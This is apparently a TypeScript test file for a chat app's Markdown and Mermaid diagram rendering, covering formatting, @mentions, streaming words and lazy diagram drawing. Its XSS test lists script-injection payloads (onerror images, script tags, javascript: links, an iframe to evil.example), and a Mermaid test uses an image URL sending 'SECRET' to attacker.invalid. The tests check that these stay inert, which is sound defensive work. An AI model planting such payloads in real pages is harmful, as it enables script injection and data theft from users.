import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, test } from "bun:test";
import { setupDom } from "@agenteschat/ui/testing/dom";

setupDom();

import { readFileSync } from "node:fs";
import { join } from "node:path";
import { act, cleanup, fireEvent, render, within } from "@testing-library/react";
import { Glob } from "bun";
import { MessageBody } from "@/chat/MessageBody";
import { setMermaidRenderer } from "@/components/artifacts/Mermaid";
import { createI18n } from "@/i18n";
import { Markdown, renderInline } from "@/lib/markdown";
import { ADA_ID, createFakeApi, ENG_ID, ORG_ID, seedState } from "./fake-api";
import { renderApp, screen, settle } from "./render";

afterEach(() => cleanup());

const body = (text: string, resolve?: (h: string) => string | null) =>
  render(<MessageBody body={text} resolveMention={resolve} />).container;

describe("message Markdown", () => {
  test("bold, italic, inline code, code blocks, lists, links and line breaks", () => {
    const el = body(
      [
        "**Subir pra produção:** depois das 18h, _sem pressa_.",
        "Primeira linha",
        "segunda linha",
        "",
        "- rodar `bun test`",
        "- conferir o [painel](https://status.acme.com)",
        "",
        "1. build",
        "2. deploy",
        "",
        "```ts",
        "const x = **not bold**;",
        "```",
        "Veja https://acme.com/a_b_c.",
      ].join("\n"),
    );
    expect(el.querySelector("strong")?.textContent).toBe("Subir pra produção:");
    expect(el.textContent).not.toContain("**Subir");
    expect(el.querySelector("em")?.textContent).toBe("sem pressa");
    // Line breaks inside a paragraph are kept (shown by white-space: pre-wrap).
    expect(
      Array.from(el.querySelectorAll("p")).some((p) => p.textContent?.includes("Primeira linha\nsegunda linha")),
    ).toBe(true);
    expect(Array.from(el.querySelectorAll("ul li")).map((li) => li.textContent)).toEqual([
      "rodar bun test",
      "conferir o painel",
    ]);
    expect(el.querySelector("ul li code")?.textContent).toBe("bun test");
    expect(el.querySelectorAll("ol li")).toHaveLength(2);
    // Code blocks stay literal, in mono.
    expect(el.querySelector("pre code")?.textContent).toBe("const x = **not bold**;");
    const links = Array.from(el.querySelectorAll("a"));
    expect(links.map((a) => a.getAttribute("href"))).toEqual(["https://status.acme.com", "https://acme.com/a_b_c"]);
    for (const a of links) expect(a.getAttribute("rel")).toBe("noopener noreferrer");
    // URLs and snake_case are never turned into italics.
    expect(el.querySelectorAll("em")).toHaveLength(1);
  });

  test("@mentions become our mention chips, not inside code or emails", () => {
    const el = body("@ada olha `@atlas` e fala com joao@acme.com, **@theo**", (h) =>
      h === "ada" ? "Ada" : h === "theo" ? "Theo" : null,
    );
    const mentions = Array.from(el.querySelectorAll(".ac-mention")).map((m) => m.textContent);
    expect(mentions).toEqual(["@Ada", "@Theo"]);
    expect(el.querySelector("code")?.textContent).toBe("@atlas");
    expect(el.textContent).toContain("joao@acme.com");
  });

  test("XSS attempts stay inert text", () => {
    const attacks = [
      '<img src=x onerror="alert(1)">',
      "<script>alert(1)</script>",
      "[clique](javascript:alert(1))",
      "[dados](data:text/html,<script>alert(1)</script>)",
      '<a href="javascript:alert(1)">x</a>',
      "**<iframe src=//evil.example>**",
      "```\n</code></pre><script>alert(1)</script>\n```",
    ].join("\n\n");
    const el = body(attacks);
    for (const tag of ["img", "script", "iframe"]) expect(el.querySelector(tag)).toBeNull();
    for (const a of Array.from(el.querySelectorAll("a"))) {
      expect(a.getAttribute("href") ?? "").toMatch(/^(https?:|mailto:)/);
    }
    // No element got an event-handler attribute.
    for (const node of Array.from(el.querySelectorAll("*"))) {
      for (const attr of Array.from(node.attributes)) expect(attr.name.startsWith("on")).toBe(false);
    }
    expect(el.textContent).toContain("<script>alert(1)</script>");
    expect(el.textContent).toContain("[clique](javascript:alert(1))");
    expect(el.querySelector("strong")?.textContent).toBe("<iframe src=//evil.example>");
  });

  test("renderInline without a mention renderer keeps @ as text", () => {
    const { container } = render(<p>{renderInline("oi @ada")}</p>);
    expect(container.textContent).toBe("oi @ada");
    expect(container.querySelector(".ac-mention")).toBeNull();
  });
});

describe("in the channel", () => {
  test("agent and people messages render Markdown", async () => {
    const state = seedState();
    state.messages.push(
      {
        id: "m-md-1",
        channelId: ENG_ID,
        threadId: null,
        author: { type: "agent", id: ADA_ID },
        body: "**Subir pra produção:**\n- migrar o banco\n- trocar a flag",
        mentionedAgentIds: [],
        agentRunId: "r-md",
        createdAt: new Date().toISOString(),
      },
      {
        id: "m-md-2",
        channelId: ENG_ID,
        threadId: null,
        author: { type: "person", id: "u-joao" },
        body: "Combinado, *amanhã* cedo @ada",
        mentionedAgentIds: [ADA_ID],
        agentRunId: null,
        createdAt: new Date().toISOString(),
      },
    );
    await renderApp(`/org/${ORG_ID}/c/${ENG_ID}`, { api: createFakeApi(state) });
    await settle(6);
    const rows = screen().getAllByRole("article");
    const agent = rows.find((r) => r.textContent?.includes("Subir pra produção:")) as HTMLElement;
    expect(agent.querySelector("strong")?.textContent).toBe("Subir pra produção:");
    expect(agent.textContent).not.toContain("**");
    expect(agent.querySelectorAll("li")).toHaveLength(2);
    const person = rows.find((r) => r.textContent?.includes("Combinado")) as HTMLElement;
    expect(person.querySelector("em")?.textContent).toBe("amanhã");
    expect(person.querySelector(".ac-mention")?.textContent).toBe("@Ada");
  });
});

describe("streaming words", () => {
  test("Markdown with `words`: each plain word in an .ac-word span; mentions and code stay whole", () => {
    const el = render(
      <Markdown
        source={"Oi **time**, olha `bun test` com @ada agora"}
        variant="message"
        words
        mention={(h, k) => (
          <span key={k} className="ac-mention">
            @{h}
          </span>
        )}
      />,
    ).container;
    const words = [...el.querySelectorAll(".ac-word")].map((w) => w.textContent);
    expect(words).toEqual(["Oi", "time", ",", "olha", "com", "agora"]);
    expect(el.querySelector("code")?.textContent).toBe("bun test");
    expect(el.querySelector("code .ac-word")).toBeNull();
    expect(el.querySelector(".ac-mention")?.textContent).toBe("@ada");
    expect(el.textContent).toBe("Oi time, olha bun test com @ada agora");
  });

  test("without `words` nothing is wrapped (the final message)", () => {
    expect(body("Uma frase só.").querySelector(".ac-word")).toBeNull();
  });

  test("MessageBody live: settled blocks plain, the tail last with fading words", () => {
    const el = render(<MessageBody body={"Primeiro bloco.\n\nAgora escrevendo"} live />).container;
    const blocks = el.querySelectorAll(".md");
    expect(blocks).toHaveLength(2);
    expect(blocks[0]?.querySelector(".ac-word")).toBeNull();
    expect(blocks[1]?.classList.contains("md--tail")).toBe(true);
    expect(el.lastElementChild).toBe(blocks[1] ?? null);
    expect([...(blocks[1]?.querySelectorAll(".ac-word") ?? [])].map((w) => w.textContent)).toEqual([
      "Agora",
      "escrevendo",
    ]);
  });
});

describe("```mermaid fences", () => {
  /** The sources the page asked to draw (the fake stands in for mermaid, which needs a browser's layout). */
  const asked: string[] = [];
  beforeAll(() => createI18n("pt-BR"));
  afterAll(() => setMermaidRenderer(null));
  beforeEach(() => {
    asked.length = 0;
    // Set again for each test: that also forgets what the last test drew.
    setMermaidRenderer(async (_id, source) => {
      asked.push(source);
      if (source.includes("-->>")) throw new Error("Parse error on line 2");
      return `<svg xmlns="http://www.w3.org/2000/svg" width="100%" style="max-width: 640px;" viewBox="-8 -8 640 120"><text>${source.length}</text></svg>`;
    });
  });

  const FLOW = "flowchart LR\n  A[Pedido] --> B{Aprovado?}\n  B -- sim --> C[Deploy]";
  const fence = (source: string) => `\`\`\`mermaid\n${source}\n\`\`\``;
  const svgOf = (img: Element | null) => {
    const src = img?.getAttribute("src") ?? "";
    return decodeURIComponent(src.slice(src.indexOf(",") + 1));
  };

  test("drawn in its code card at its own size; Código shows the source, copy stays", async () => {
    const el = render(<Markdown source={`O fluxo:\n\n${fence(FLOW)}`} />).container;
    await settle();
    const img = el.querySelector(".code-card__preview img");
    expect(img?.getAttribute("alt")).toBe("Diagrama");
    expect(img?.getAttribute("src")?.startsWith("data:image/svg+xml")).toBe(true);
    // Its own size, not its box's width ("100%"); the card fits it down to 60% of that (`--w`), then it scrolls.
    expect(svgOf(img)).toContain('width="640" height="120"');
    expect((img as HTMLElement).style.getPropertyValue("--w")).toBe("640px");
    expect(el.querySelector(".code-card__code")).toBeNull();
    const card = el.querySelector(".code-card") as HTMLElement;
    expect(card.querySelector(".code-card__lang")?.textContent).toBe("Mermaid");
    expect(within(card).getByRole("button", { name: "Copiar" })).toBeTruthy();
    const code = within(card).getByRole("button", { name: "Código" });
    await act(async () => fireEvent.click(code));
    expect(code.getAttribute("aria-pressed")).toBe("true");
    expect(card.querySelector(".code-card__preview")).toBeNull();
    expect(card.querySelector(".code-card__code")?.textContent).toBe(FLOW);
    expect(asked).toEqual([FLOW]);
  });

  test("one that doesn't parse stays a code block: no image, no error", async () => {
    const bad = "sequenceDiagram\n  Ana-->>";
    const el = render(<MessageBody body={`Tentei:\n\n${fence(bad)}`} />).container;
    await settle();
    expect(asked).toEqual([bad]);
    expect(el.querySelector("img")).toBeNull();
    expect(el.querySelector(".code-card__code")?.textContent).toBe(bad);
    expect(within(el).queryByRole("button", { name: "Código" })).toBeNull();
    expect(el.querySelector(".artifact-diagram")).toBeNull();
    expect(el.textContent).not.toContain("Não foi possível");
  });

  test("while an answer streams its last block stays code, open or closed; the finished message draws it", async () => {
    const view = render(<MessageBody body={`Olha o fluxo:\n\n\`\`\`mermaid\n${FLOW}`} live />);
    await settle();
    const el = view.container;
    expect(el.querySelector(".md--tail .code-card__code")?.textContent).toBe(FLOW);
    view.rerender(<MessageBody body={`Olha o fluxo:\n\n${fence(FLOW)}`} live />);
    await settle();
    expect(el.querySelector(".md--tail .code-card__code")?.textContent).toBe(FLOW);
    expect(el.querySelector("img")).toBeNull();
    expect(asked).toEqual([]);
    view.rerender(<MessageBody body={`Olha o fluxo:\n\n${fence(FLOW)}`} />);
    await settle();
    expect(el.querySelector(".code-card__preview img")).not.toBeNull();
    expect(asked).toEqual([FLOW]);
  });

  test("a closed fence the answer has moved past is drawn while it streams, once", async () => {
    const answer = `Olha o fluxo:\n\n${fence(FLOW)}\n\nDepois do deploy`;
    const view = render(<MessageBody body={answer} live />);
    await settle();
    expect(view.container.querySelector(".code-card__preview img")).not.toBeNull();
    view.rerender(<MessageBody body={`${answer} eu aviso.`} live />);
    await settle();
    // The finished message takes the live row's place: the drawing is reused, not made again.
    view.unmount();
    const done = render(<MessageBody body={`${answer} eu aviso.`} />).container;
    expect(done.querySelector(".code-card__preview img")).not.toBeNull();
    expect(asked).toEqual([FLOW]);
  });

  test("a diagram already drawn stays drawn while the answer pauses on a blank line", async () => {
    const answer = `Olha:\n\n${fence(FLOW)}\n\nDepois do deploy.`;
    const view = render(<MessageBody body={`${answer} E`} live />);
    await settle();
    // The reveal stops after whole words and their spaces: at a paragraph break the whole answer is the tail.
    view.rerender(<MessageBody body={`${answer}\n\n`} live />);
    await settle();
    const el = view.container;
    expect(el.querySelector(".md--tail .code-card__preview img")).not.toBeNull();
    expect(el.querySelector(".code-card__code")).toBeNull();
    expect(asked).toEqual([FLOW]);
  });

  /** What the fake drew for a source, as found in the image. */
  const drawingOf = (source: string) => `<text>${source.length}</text>`;
  const shown = (el: Element) => svgOf(el.querySelector(".code-card__preview img"));
  const pause = (ms: number) => act(() => new Promise<void>((resolve) => setTimeout(resolve, ms)));

  test("typing in a diagram keeps its last drawing on screen and draws again once the typing stops", async () => {
    const view = render(<Markdown source={fence(FLOW)} />);
    await settle();
    const el = view.container;
    for (const typed of ["!", "!!", "!!!"]) {
      view.rerender(<Markdown source={fence(`${FLOW}${typed}`)} />);
      await settle();
      expect(shown(el)).toContain(drawingOf(FLOW));
      expect(el.querySelector(".code-card__code")).toBeNull();
    }
    await pause(350);
    await settle();
    expect(shown(el)).toContain(drawingOf(`${FLOW}!!!`));
    expect(asked).toEqual([FLOW, `${FLOW}!!!`]);
  });

  test("drawings waiting their turn are dropped when their block is gone", async () => {
    const waiting: (() => void)[] = [];
    setMermaidRenderer(
      (_id, source) =>
        new Promise((resolve) => {
          asked.push(source);
          waiting.push(() => resolve(`<svg xmlns="http://www.w3.org/2000/svg">${drawingOf(source)}</svg>`));
        }),
    );
    const sources = ["flowchart LR\n  A --> B", "flowchart LR\n  C --> D", "flowchart LR\n  E --> F"];
    const view = render(<Markdown source={sources.map(fence).join("\n\n")} />);
    await settle();
    // The first is being drawn and the others wait behind it when the page is left.
    expect(asked).toEqual([sources[0] ?? ""]);
    view.unmount();
    for (const done of waiting) done();
    await settle();
    expect(asked).toEqual([sources[0] ?? ""]);
  });

  test("the same diagram twice on a page is drawn once", async () => {
    const el = render(<Markdown source={`${fence(FLOW)}\n\nDe novo:\n\n${fence(FLOW)}`} />).container;
    await settle();
    expect(el.querySelectorAll(".code-card__preview img")).toHaveLength(2);
    expect(asked).toEqual([FLOW]);
  });

  test("switching theme keeps the drawing on screen until the other theme's is ready", async () => {
    setMermaidRenderer(async (_id, source, dark) => {
      asked.push(`${dark ? "dark" : "light"}: ${source}`);
      return `<svg xmlns="http://www.w3.org/2000/svg"><text>${dark ? "dark" : "light"}</text></svg>`;
    });
    const el = render(<Markdown source={fence(FLOW)} />).container;
    await settle();
    expect(shown(el)).toContain("<text>light</text>");
    const html = document.documentElement;
    try {
      await act(async () => {
        html.dataset.theme = "dark";
      });
      await settle();
      expect(shown(el)).toContain("<text>light</text>");
      await pause(350);
      await settle();
      expect(shown(el)).toContain("<text>dark</text>");
      expect(asked).toEqual([`light: ${FLOW}`, `dark: ${FLOW}`]);
    } finally {
      await act(async () => {
        delete html.dataset.theme;
      });
    }
  });

  test("the diagram's accTitle and accDescr name and describe its image", async () => {
    setMermaidRenderer(
      async () =>
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 80"><title id="chart-title-mmd-1">Fluxo de deploy</title><desc id="chart-desc-mmd-1">Do pedido &amp; aprovação ao deploy</desc><g><title>nó</title></g></svg>',
    );
    const el = render(<Markdown source={fence(`${FLOW}\n  accTitle: Fluxo de deploy`)} />).container;
    await settle();
    const img = el.querySelector(".code-card__preview img");
    expect(img?.getAttribute("alt")).toBe("Fluxo de deploy");
    expect(img?.getAttribute("aria-description")).toBe("Do pedido & aprovação ao deploy");
  });

  test("a source that would make the page load something never reaches mermaid and stays code", async () => {
    const image = 'flowchart TD\n  A@{ img: "https://attacker.invalid/p.png?leak=SECRET" }';
    const view = render(<MessageBody body={`Veja:\n\n${fence(image)}`} />);
    await settle();
    expect(asked).toEqual([]);
    expect(view.container.querySelector(".code-card__code")?.textContent).toBe(image);
    expect(view.container.querySelector("img")).toBeNull();
    // A front matter with only a title still draws.
    const titled = `---\ntitle: Fluxo\n---\n${FLOW}`;
    view.rerender(<MessageBody body={fence(titled)} />);
    await settle();
    expect(asked).toEqual([titled]);
    expect(view.container.querySelector(".code-card__preview img")).not.toBeNull();
  });

  test("a diagram longer than mermaid draws stays code", async () => {
    const long = `flowchart LR\n  A[${"x".repeat(50_000)}] --> B`;
    const el = render(<Markdown source={fence(long)} />).container;
    await settle();
    expect(asked).toEqual([]);
    expect(el.querySelector(".code-card__code")).not.toBeNull();
  });

  test("a page with no mermaid fence never loads mermaid", async () => {
    render(<Markdown source={"# Notas\n\nTexto.\n\n```ts\nconst a = 1;\n```\n\n- item"} />);
    render(<MessageBody body={"Oi **time**\n\n```\nflowchart LR\n  A --> B\n```"} />);
    await settle();
    expect(asked).toEqual([]);
    expect(document.querySelector("img")).toBeNull();
    // Nothing imports mermaid up front: only the renderer loads it, with import(), when a diagram is drawn.
    const src = join(import.meta.dir, "..", "src");
    const upFront = [...new Glob("**/*.{ts,tsx}").scanSync(src)].filter((f) =>
      /^\s*import\s+(?!type\b)[^;(]*["']mermaid["']/m.test(readFileSync(join(src, f), "utf8")),
    );
    expect(upFront).toEqual([]);
  });
});
